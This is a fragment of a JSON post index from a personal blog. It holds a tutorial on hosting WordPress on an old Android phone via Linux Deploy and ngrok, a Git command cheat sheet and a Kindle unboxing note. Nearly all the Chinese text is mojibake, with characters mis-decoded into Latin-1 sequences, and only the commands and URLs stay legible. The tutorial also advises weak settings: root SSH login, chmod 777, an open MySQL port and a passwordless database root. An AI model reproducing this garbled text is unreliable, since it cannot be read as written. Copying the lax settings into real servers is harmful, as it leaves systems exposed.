#æœ€åˆæˆ‘é€‰çš„æ˜¯arm64ï¼Œåæ¥æƒ³è£…èŠ±ç”Ÿå£³çš„æ—¶å€™å‘ç°linuxç‰ˆçš„x86å’Œx64éƒ½ä¸èƒ½å®‰è£…ï¼Œè€Œé€‚é…ç»™æ ‘è“æ´¾çš„armhfç‰ˆå¯ä»¥å®‰è£…ã€‚ å‘è¡Œç‰ˆGUN/Linuxç‰ˆæœ¬ï¼šstretch æºåœ°å€ï¼š[ä¸­ç§‘å¤§çš„é•œåƒæº](https://mirrors.ustc.edu.cn/debian/) å®‰è£…ç±»å‹ï¼šç›®å½• å®‰è£…è·¯å¾„ï¼šä¿æŒé»˜è®¤ ç”¨æˆ·åï¼šè‡ªå®šä¹‰ ç”¨æˆ·å¯†ç ï¼šè‡ªå®šä¹‰ ç‰¹æƒç”¨æˆ·ï¼šroot DNSï¼šè‡ªåŠ¨ å†ä¸‹é¢çš„å‹¾é€‰å¯ç”¨SSHå°±è¡Œäº†ï¼ŒæŒ‚è½½Androidä¸Šçš„èµ„æºä»¥åç©ºé—´ä¸å¤Ÿäº†å¯ä»¥ç»™SDå¡åˆ†åŒºä¸€ä¸‹æŒ‚ä¸Šå»ï¼Œå›¾å½¢ç•Œé¢æƒ³ç”¨çš„ä¹Ÿå¯ä»¥å¯ç”¨ï¼ŒåŸºæœ¬ç”¨ä¸ç€ã€‚ å®¶é‡Œè”é€š50Mï¼Œ20åˆ†é’Ÿä¸åˆ°å°±éƒ¨ç½²å®Œäº†ï¼Œéƒ¨ç½²å®Œç‚¹å‡»å·¦ä¸‹è§’çš„å¯åŠ¨ï¼Œæ­£å¸¸å¯åŠ¨å®Œï¼Œæ²¡æŠ¥é”™å•¥çš„è¯ï¼Œlinuxå°±å·²ç»è£…å¥½äº†ï¼Œç‚¹å¼€å¦ä¸€ä¸ªè½¯ä»¶JuiceSSHï¼Œè¾“å…¥ipï¼ˆè¿™é‡Œçš„192.168.123.233æ˜¯æˆ‘éšä¾¿è¾“çš„ï¼Œå…·ä½“çš„å±€åŸŸç½‘ipï¼Œlinuxdeployè¿™ä¸ªappæ‰“å¼€ï¼Œæ˜¾ç¤ºåœ¨æœ€ä¸Šé¢ä¸€è¡Œçš„å°±æ˜¯ï¼Œè¦è¿ç€å®¶é‡Œçš„wifiï¼Œè‡ªå·±çš„ç”µè„‘æ‰èƒ½è¿çš„ä¸Šï¼Œè¿4Gç½‘æ˜¯è¿ä¸ä¸Šçš„ï¼‰ï¼Œç«¯å£å·ï¼š22ï¼Œç”¨æˆ·åå¯†ç æ˜¯åˆšåˆšè‡ªå·±è®¾ç½®çš„ï¼Œä¸è¿‡æ‰‹æœºä¸Šå­—å¤ªå°ï¼Œä¸å¥½æ“ä½œæˆ‘ä»¬ç”¨ç”µè„‘ä¸Šçš„SecureCRTæˆ–è€…puttyã€xshellè¿æ¥è¿™å°æ‰‹æœºçš„å±€åŸŸç½‘IPæ¥æ“ä½œï¼Œè¿™é‡Œæˆ‘ç”¨çš„æ˜¯secureCRTã€‚ ç‚¹å‡»è¿æ¥ï¼Œè¾“å…¥å®Œå¯†ç ä¹‹åå°±è¿›å…¥äº†å®ƒçš„å‘½ä»¤è¡Œç•Œé¢ã€‚ å…ˆè®¾ç½®ä¸€ä¸‹rootç”¨æˆ·çš„å¯†ç  sudo passwd root #è¾“å…¥å›è½¦åå†è¾“å…¥ä¸¤éå¯†ç  su #è¾“å…¥åå›è½¦ï¼Œå†è¾“å…¥åˆšåˆšè®¾ç½®çš„å¯†ç ï¼Œåˆ‡æ¢æˆrootç”¨æˆ· apt-get install vim #å®‰è£…vimç¼–è¾‘å™¨ï¼Œéœ€è¦ç¡®è®¤çš„åœ°æ–¹è¾“ä¸ªY vim /etc/ssh/sshd_config #ç¼–è¾‘sshè®¾ç½®æ–‡ä»¶ï¼Œæ‰“å¼€rootç”¨æˆ·çš„è¿œç¨‹ç™»é™†æƒé™ æ‰¾åˆ°PermitRootLogin è¿™ä¸€æ ·ï¼ŒæŒ‰Shift+Ié”®è¿›å…¥ç¼–è¾‘ï¼Œå°†PermitRootLoginå‰é¢çš„â€œ#â€åˆ æ‰ï¼Œåé¢çš„æ”¹æˆyesï¼Œå¦‚å›¾ ç„¶åæŒ‰ä¸€ä¸‹Escé”®ï¼Œè¾“å…¥:wq!åå›è½¦ï¼Œæ³¨æ„æœ‰ä¸ªå†’å·ã€‚ å¥½äº†ï¼Œæ¥ä¸‹æ¥å°±ç›´æ¥ç”¨rootç”¨æˆ·ç™»é™†ï¼Œä¸ç”¨å…ˆç™»é™†adminå†åˆ‡æ¢åˆ°rootäº† æ¥ä¸‹æ¥å®‰è£…nginxï¼Œphpï¼Œmysqlï¼Œå¯ä»¥ä¸€æ¬¡æ€§è¾“å…¥å®‰è£…å‘½ä»¤ apt-getinstall nginx php7.0-fpm mysql-server-5.7 php7.0-mysql è£…å®Œä¹‹åå¯åŠ¨æœåŠ¡ service nginx start service php7.0-fpm start service mysql start #æˆ‘è¿™é‡ŒMySQLå¯åŠ¨å¤±è´¥ï¼Œè¾“å…¥ usermod -a -G aid_net_raw mysqlåå†æ¬¡è¾“å…¥å¯åŠ¨mysqlçš„å‘½ä»¤ ç„¶åé…ç½®ä¸€ä¸‹nginxçš„é…ç½®æ–‡ä»¶ vim/etc/nginx/sites-available/default #ä¿®æ”¹ä¸¤ä¸ªï¼Œå¢åŠ ä¸€ä¸ªindex.phpæ ¼å¼æ”¯æŒï¼ŒæŠŠå…³äºphp7.0-fpmçš„æ³¨é‡Šå»æ‰ è£…ä¸€ä¸‹é˜²ç«å¢™å¹¶æ‰“å¼€80å’Œ3306ç«¯å£ apt-get install ufw #å®‰è£…é˜²ç«å¢™ ufw allow 3306 #æ‰“å¼€3306ç«¯å£ æ•°æ®åº“è¿œç¨‹ ufw allow 80 #æ‰“å¼€80ç«¯å£ ç„¶åé‡å¯ä¸€ä¸‹æœåŠ¡ service nginx restart services php7.0-fpm restart ç„¶åç”µè„‘æ‰“å¼€æµè§ˆå™¨è®¿é—® http://ï¼ˆä½ çš„æ‰‹æœºçš„å±€åŸŸç½‘ipï¼‰æ¯”å¦‚192.168.123.233 æŸ¥çœ‹æ˜¯å¦æœ‰welcome to nginxï¼çš„æç¤º ç„¶åä¸‹è½½wordpressä¸Šä¼ åˆ°linuxç³»ç»Ÿçš„ /var/www/html è·¯å¾„ä¸‹ï¼ˆè¿™ä¸ªè·¯å¾„åœ¨ä¸Šé¢ä¿®æ”¹çš„é‚£ä¸ªæ–‡ä»¶é‡Œä¹Ÿå¯ä»¥æ”¹ï¼‰,è¿›å…¥wordpersså®˜ç½‘ï¼Œæ‰¾åˆ°ä¸‹è½½WordpressæŒ‰é’® ï¼Œå…ˆæ”¾åˆ°æœ¬åœ°ç”µè„‘çš„éšä¾¿å“ªé‡Œï¼Œæ¯”å¦‚è¯´D:/Downloadè¿™é‡Œ ä¸‹è½½.zipæˆ–è€….tar.gzæ ¼å¼çš„éƒ½å¯ä»¥ï¼Œåªæ˜¯ä¸€ä¼šå„¿è§£å‹çš„å‘½ä»¤ä¸åŒ ç‚¹å‡»SecureCRTå·¦ä¸Šè§’çš„File--&gt;Connect SFTP sessionï¼Œå³è¾¹ä¼šå‡ºæ¥ä¸€ä¸ªsftpçª—å£ åœ¨stfpçª—å£è¾“å…¥ cd /opt/ #è¡¨ç¤ºè¿›å…¥linuxçš„optç›®å½• lcd D:/Download/ #è¡¨ç¤ºè¿›å…¥æœ¬è®¡ç®—æœºçš„D:/Download ï¼ˆåˆšåˆšå­˜æ”¾wordpresså‹ç¼©åŒ…çš„è·¯å¾„ï¼‰ put wordpress-4.9.1-zh_CN.tar.gz #å°†æ­¤å‹ç¼©åŒ…ç”±æœ¬åœ°æ¨é€åˆ°linuxçš„æŒ‡å®šç›®å½• ç„¶åå›åˆ°å·¦è¾¹çš„linuxå‘½ä»¤è¡Œ cd /var/www/html/ #è¿›å…¥nginxé…ç½®æ–‡ä»¶ä¸­å®šä¹‰çš„ç½‘ç«™æ ¹ç›®å½• ls #å¯ä»¥è¾“å…¥lsæŸ¥çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰æ‹·è¿›æ¥ tar zxf wordpress-4.9.1-zh_CN.tar.gz # è§£å‹å‘½ä»¤ï¼Œè¿™é‡Œæˆ‘è§£å‹è¿‡äº†å°±ä¸æ¼”ç¤ºäº†ï¼ŒCTRL+Cé”®æ˜¯å–æ¶ˆå½“å‰å‘½ä»¤ ç„¶åæµè§ˆå™¨è®¿é—®http://192.168.123.233ï¼ˆä½ çš„æ‰‹æœºçš„å±€åŸŸç½‘ipï¼‰/wordpress èƒ½çœ‹åˆ°wordpressçš„å®‰è£…å¼•å¯¼ï¼Œæˆ‘å·²ç»å®‰è£…è¿‡äº†ï¼Œå°±ç½‘ä¸Šæˆªäº†ä¸ªå›¾ç»™å¤§å®¶çœ‹ä¸€ä¸‹ æ¥ä¸‹æ¥å…ˆä¸æ€¥ç€å®‰è£…ï¼Œæˆ‘ä»¬å¾—å…ˆå‡†å¤‡è¿™ä¸ªé¡µé¢ä¸Šæ‰€è¯´çš„æ•°æ®åº“ç”¨æˆ·ä¿¡æ¯ mysql -u root # ä»¥rootç”¨æˆ·ç™»é™†mysqlæ•°æ®åº“ï¼Œè¿™é‡Œä¹‹å‰apt-get install mysqlçš„è¿‡ç¨‹ä¸­å¦‚æœè®©è®¾ç½®äº†å¯†ç ï¼Œå°±è¦è¾“å…¥ mysql -u root -pï¼Œç„¶åå›è½¦åè¾“å…¥å¯†ç ï¼Œæˆ‘è¿™é‡Œæ²¡è®¾ç½®ï¼Œä¸è¾“å¯†ç å°±èƒ½è¿›å…¥ ç„¶åå¼€å§‹è¿›å…¥æ•°æ®åº“çš„æ“ä½œå‘½ä»¤è¡Œ CREATE DATABASE wpdb; #åˆ›å»ºä¸€ä¸ªå«wpdbçš„æ•°æ®åº“ï¼Œè¿™ä¸ªåå­—è‡ªå®šä¹‰ï¼Œè®°å¾—å°±å¥½ï¼Œæœ€åæœ‰åˆ†å·ä¸èƒ½æ¼ CREATE USER wpuser@localhost IDENTIFIED BY â€˜wppassâ€™; #wpuserå’Œwppassåˆ†åˆ«æ˜¯ç”¨æˆ·åå’Œå¯†ç ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰ï¼Œæ³¨æ„åˆ†å· GRANT ALL PRIVILEGES ON wpdb.* TO wpuser@localhost; #ç»™wpuseræ“ä½œwpdbçš„æƒé™ï¼Œæ³¨æ„åˆ†å· FLUSH PRIVILEGES; #ç«‹å³åˆ·æ–°ç”Ÿæ•ˆï¼Œæ³¨æ„åˆ†å· EXIT #é€€å‡ºmysqlæ“ä½œå‘½ä»¤è¡Œï¼Œè¿™ä¸ªä¸éœ€è¦åˆ†å· ç„¶åé‡å¯ä¸€ä¸‹mysqlå’ŒnginxæœåŠ¡ service mysql restart service nginx restart ç„¶åè®¿é—®http://192.168.123.233ï¼ˆä½ çš„å±€åŸŸç½‘é‡Œçš„æ‰‹æœºipï¼‰/wordpresså†æ¬¡è¿›å…¥wordpressçš„å®‰è£…ç•Œé¢ï¼Œæ ¹æ®æç¤ºå¡«å…¥åˆšåˆšè®¾ç½®çš„æ•°æ®åº“åï¼Œæ•°æ®åº“ç”¨æˆ·åï¼Œå¯†ç ï¼Œå°±æ˜¯ä¸‹å›¾æ‰“ç çš„åœ°æ–¹ï¼Œæˆ‘å·²ç»è£…å¥½äº†ï¼Œè¿™æ˜¯ç½‘ä¸Šæˆªå›¾çš„ã€‚ ç„¶åä¸€ç›´ä¸‹ä¸€æ­¥å°±è£…å®Œäº†ï¼Œå†æ¬¡è®¿é—®é»˜è®¤ä¸»é¢˜å°±æ˜¯è¿™æ ·çš„ï¼Œå¯ä»¥è‡ªå·±å»æœä¸ªä¸»é¢˜è£…ä¸€ä¸‹å“Ÿ åé¢å¯èƒ½å‡ºç°ä¸€ä¸ªwordpressæ— æ³•æ“ä½œä¸€ä¸ªcontigæ–‡ä»¶çš„é”™è¯¯ï¼Œç…§ç€å®ƒçš„æç¤ºåœ¨æœ¬åœ°ç¼–è¾‘å¥½ï¼Œå†ç”¨sftpä¸Šä¼ åˆ°/var/www/html/wordpressé‡Œå°±å¯ä»¥äº† æ¥ä¸‹æ¥æ˜¯ä½¿ä½ çš„åšå®¢èƒ½ä»å¤–ç½‘è®¿é—®ï¼Œå¯ä»¥ç”¨èŠ±ç”Ÿå£³ï¼Œå¯ä»¥ç”¨ngrokï¼Œè¿™é‡Œæˆ‘ç”¨çš„æ˜¯ngrok æ‰“å¼€ngrok æ³¨å†Œä¸€ä¸ªå…è´¹è´¦æˆ·ï¼Œç”³è¯·ä¸€ä¸ªå…è´¹çš„éš§é“ï¼Œå¹¶è®°ä¸‹éš§é“idï¼Œè¿™é‡Œæˆ‘ä¹°äº†10å…ƒé’±çš„ä»˜è´¹ä¸€ä¸ªæœˆæœåŠ¡ï¼Œå…è´¹çš„å°±å¯ä»¥ åŸŸåè‡ªå®šä¹‰ï¼Œè¿™é‡Œngrokå¯ä»¥ç›´æ¥éƒ¨ç½²åœ¨ä½ æ‰‹æœºä¸Šçš„linuxç³»ç»Ÿä¸­ï¼Œä¹Ÿå¯ä»¥éƒ¨ç½²åœ¨è·¯ç”±å™¨ä¸­ï¼Œç›´æ¥éƒ¨ç½²åœ¨ç³»ç»Ÿä¸­å°±å¡«127.0.0.1:80ç”¨æˆ·åå¯†ç ä¸ç”¨å¡«ï¼Œéƒ¨ç½²åœ¨è·¯ç”±å™¨ä¸Šçš„è¯ï¼Œå¡«å…¥è·¯ç”±å™¨ç»™ä½ æ‰‹æœºåˆ†çš„ip 192.168.123.233:80ï¼Œç”¨æˆ·åå¯†ç å’Œè·¯ç”±å™¨ä¸Šè®¾ç½®çš„ä¸€æ ·ï¼Œæ’¸äº†æ–è®¯è·¯ç”±å™¨çš„åˆ·ä¸ªpadavanæˆ–è€…è’é‡æ— ç¯çš„å›ºä»¶å°±å¯ä»¥è®¾ç½®ngrokäº† ç„¶åå»ngrokçš„é¦–é¡µä¸‹è½½å®‰è£…åŒ… ç„¶åè¿˜æ˜¯ç”¨sftpæ¨é€åˆ°linuxç³»ç»Ÿé‡Œ cd /opt/ #è¿›å…¥ç›®å½• chmod -R 777 sunny #ç»™è¿™ä¸ªæ–‡ä»¶èµ‹äºˆå¯æ‰§è¡Œæƒé™ ./sunny clientid ************ #è¿™é‡Œçš„***æ˜¯ä½ çš„éš§é“id å‡ºç°ä¸‹é¢é¡µé¢å°±æ˜¯è¿è¡ŒæˆåŠŸäº†ï¼Œç„¶åè®¿é—®http://ä½ çš„å‰ç½®åŸŸå.free.ngrok.cc/wordpress å°±å¯ä»¥è®¿é—®ä½ çš„åšå®¢äº†ï¼Œ(å¦‚æœæ˜¯ä»˜è´¹çš„ï¼Œæ˜¯http://å‰ç½®åŸŸå.viphk.ngrok.org/wordpressæˆ‘çš„å‰ç½®åŸŸåæ˜¯liptenå“Ÿ)ï¼ˆè¿™å¼ å›¾ç‰‡æ¥è‡ªngrokå®˜æ–¹æŒ‡å¯¼ï¼‰ ä¸‹é¢ç»™å¤§å®¶çœ‹ä¸€ä¸‹å¦‚æœæ˜¯æŠŠngrokè¿è¡Œåœ¨è·¯ç”±å™¨ä¸Šæ€ä¹ˆè®¾ç½®ï¼Œåˆ·äº†è’é‡æ— ç¯å›ºä»¶å’Œpadavançš„æ–è®¯è·¯ç”±å™¨å¯ä»¥å‚è€ƒä¸€ä¸‹ æœ€åï¼Œçºªå¿µä¸€ä¸‹æˆ‘çš„ç‹—é­” ","link":"https://hellogu.github.io/post/jiu-shou-ji-de-yu-re-zai-an-zhuo-shou-ji-shang-bu-shu-lnmpwordpress-bo-ke/"},{"title":"Gitæ“ä½œå¤‡å¿˜","content":"git clone https://github.com/ git add . ï¼ˆæ³¨ï¼šåˆ«å¿˜è®°åé¢çš„.ï¼Œæ­¤æ“ä½œæ˜¯æŠŠTestæ–‡ä»¶å¤¹ä¸‹é¢çš„æ–‡ä»¶éƒ½æ·»åŠ è¿›æ¥ï¼‰ git commit -m &quot;æäº¤ä¿¡æ¯&quot; ï¼ˆæ³¨ï¼šâ€œæäº¤ä¿¡æ¯â€é‡Œé¢æ¢æˆä½ éœ€è¦ï¼Œå¦‚â€œfirst commitâ€ï¼‰ git push -u origin master ï¼ˆæ³¨ï¼šæ­¤æ“ä½œç›®çš„æ˜¯æŠŠæœ¬åœ°ä»“åº“pushåˆ°githubä¸Šé¢ï¼Œæ­¤æ­¥éª¤éœ€è¦ä½ è¾“å…¥å¸å·å’Œå¯†ç ï¼‰ git pull origin master åˆ›å»ºä»“åº“å‘½ä»¤ ä¸‹è¡¨åˆ—å‡ºäº† git åˆ›å»ºä»“åº“çš„å‘½ä»¤ï¼š å‘½ä»¤ è¯´æ˜ git init åˆå§‹åŒ–ä»“åº“ git clone æ‹·è´ä¸€ä»½è¿œç¨‹ä»“åº“ï¼Œä¹Ÿå°±æ˜¯ä¸‹è½½ä¸€ä¸ªé¡¹ç›® æäº¤ä¸ä¿®æ”¹ Git çš„å·¥ä½œå°±æ˜¯åˆ›å»ºå’Œä¿å­˜ä½ çš„é¡¹ç›®çš„å¿«ç…§åŠä¸ä¹‹åçš„å¿«ç…§è¿›è¡Œå¯¹æ¯”ã€‚ ä¸‹è¡¨åˆ—å‡ºäº†æœ‰å…³åˆ›å»ºä¸æäº¤ä½ çš„é¡¹ç›®çš„å¿«ç…§çš„å‘½ä»¤ï¼š å‘½ä»¤ è¯´æ˜ git add æ·»åŠ æ–‡ä»¶åˆ°æš‚å­˜åŒº git status æŸ¥çœ‹ä»“åº“å½“å‰çš„çŠ¶æ€ï¼Œæ˜¾ç¤ºæœ‰å˜æ›´çš„æ–‡ä»¶ã€‚ git diff æ¯”è¾ƒæ–‡ä»¶çš„ä¸åŒï¼Œå³æš‚å­˜åŒºå’Œå·¥ä½œåŒºçš„å·®å¼‚ã€‚ git commit æäº¤æš‚å­˜åŒºåˆ°æœ¬åœ°ä»“åº“ã€‚ git reset å›é€€ç‰ˆæœ¬ã€‚ git rm å°†æ–‡ä»¶ä»æš‚å­˜åŒºå’Œå·¥ä½œåŒºä¸­åˆ é™¤ã€‚ git mv ç§»åŠ¨æˆ–é‡å‘½åå·¥ä½œåŒºæ–‡ä»¶ã€‚ git checkout åˆ†æ”¯åˆ‡æ¢ã€‚ git switch ï¼ˆGit 2.23 ç‰ˆæœ¬å¼•å…¥ï¼‰ æ›´æ¸…æ™°åœ°åˆ‡æ¢åˆ†æ”¯ã€‚ git restore ï¼ˆGit 2.23 ç‰ˆæœ¬å¼•å…¥ï¼‰ æ¢å¤æˆ–æ’¤é”€æ–‡ä»¶çš„æ›´æ”¹ã€‚ æäº¤æ—¥å¿— å‘½ä»¤ è¯´æ˜ git log æŸ¥çœ‹å†å²æäº¤è®°å½• git blame ä»¥åˆ—è¡¨å½¢å¼æŸ¥çœ‹æŒ‡å®šæ–‡ä»¶çš„å†å²ä¿®æ”¹è®°å½• è¿œç¨‹æ“ä½œ å‘½ä»¤ è¯´æ˜ git remote è¿œç¨‹ä»“åº“æ“ä½œ git fetch ä»è¿œç¨‹è·å–ä»£ç åº“ git pull ä¸‹è½½è¿œç¨‹ä»£ç å¹¶åˆå¹¶ git push ä¸Šä¼ è¿œç¨‹ä»£ç å¹¶åˆå¹¶ ","link":"https://hellogu.github.io/post/git-cao-zuo-bei-wang-1/"},{"title":"Kindle Paperwhite2 æ—¥ç‰ˆæ™’å•","content":"å‰ä¸¤å¤©çœ‹è§åŒå­¦çš„499Kindleå°±æƒ³ç€å‰æ¬¡æ‰‹äº†ï¼Œç­‰äº†ä¸€ä¸ªç¤¼æ‹œæ²¡ç­‰åˆ°ä»€ä¹ˆåŠ›åº¦å¤§çš„ä¼˜æƒ äºæ˜¯å†³å®šæ·˜å®å…¥äº†ï¼ï¼Œä¸Šæ·˜å®ä¸€çœ‹æ—¥ç‰ˆkindle pw2åªè¦718ï¼ï¼ï¼è¿˜è¦ä»€ä¹ˆå±Œä¸ç‰ˆkindle499ã€‚ ç»è¿‡ä¸¤å¤©çš„ç´§å¼ ç­‰å¾…ï¼Œæˆ‘çš„kindle pw2ç»ˆäºæ¥åˆ°äº†æˆ‘æ‰‹ä¸­ ä»å·¦å¾€å³åˆ†åˆ«æ˜¯å¥—å­ï¼Œkindleï¼Œæ•°æ®çº¿ï¼ˆæ ‡é…åªæœ‰ä¸€å°kindleï¼Œä¸€æ¡æ•°æ®çº¿ï¼Œè¯´æ˜ä¹¦ä¿ä¿®å¡æ²¡æœ‰å……ç”µå™¨ï¼‰å……ç”µå™¨å’Œæ‰‹æœºçš„é€šç”¨ã€‚æ—¥ç‰ˆå¼€æœºè¯­è¨€é€‰æ‹©é‡Œå°±æœ‰ç®€ä½“ä¸­æ–‡ã€‚ æ‹¿åˆ°æ‰‹è¿ä¸Šç½‘å‘ç°ç«Ÿç„¶æœ‰å°é¢å¹¿å‘Šï¼å¹¿å‘Šå…¶å®è¿˜å¥½ï¼Œä¸»è¦æ˜¯æœ‰ä¸ªæ»‘åŠ¨è§£é”å¤ªä¸æ–¹ä¾¿äº†ï¼Œè¿™æœ‰ä»€ä¹ˆå¥½è§£é”çš„ã€‚Kindle Paperwhite2 æ—¥ç‰ˆæ™’å• ç™¾åº¦äº†ä¸‹çŸ¥é“å‡çº§åˆ°æœ€æ–°çš„5.6.1.0.2ç³»ç»Ÿå¯ä»¥åœ¨è®¾ç½®é‡Œå…³æ‰å¹¿å‘Šã€‚äºæ˜¯ç«‹åˆ»å»äºšé©¬é€Šå®˜ç½‘ä¸‹è½½æ›´æ–°ã€‚ï¼ˆä¸è¿‡æœ€æ–°ç³»ç»Ÿä¸èƒ½è¶Šç‹±å’Œåˆ·å¤šçœ‹ï¼‰ åˆ·å®Œé‡å¯ï¼Œè¿ä¸Šwifiï¼Œç™»ä¸Šäºšé©¬é€Šè´¦å·ï¼ˆæˆ‘ç›´æ¥ç™»é™†çš„ä¸­äºšè´¦å·ï¼‰ ä¸‹é¢å±•ç¤ºä¸‹å¤§å° å•æ‰‹æ¡æŒä¸å«Œé‡ï¼Œå¾ˆè½»å·§ã€‚ èƒŒé¢æ˜¯æ¶‚å±‚çš„æ‰‹æ„Ÿï¼Œæ¯”motoxçš„æ‘¸ç€æ»‘ä¸€ç‚¹ å’Œmotoxå¤§å°å¯¹æ¯” é¡ºä¾¿æ³¨å†Œäº†ç‹—è€³æœµï¼Œè®¾ç½®äº†è‡ªåŠ¨æ¨é€ ","link":"https://hellogu.github.io/post/kindle-paperwhite2-ri-ban-shai-dan/"}]}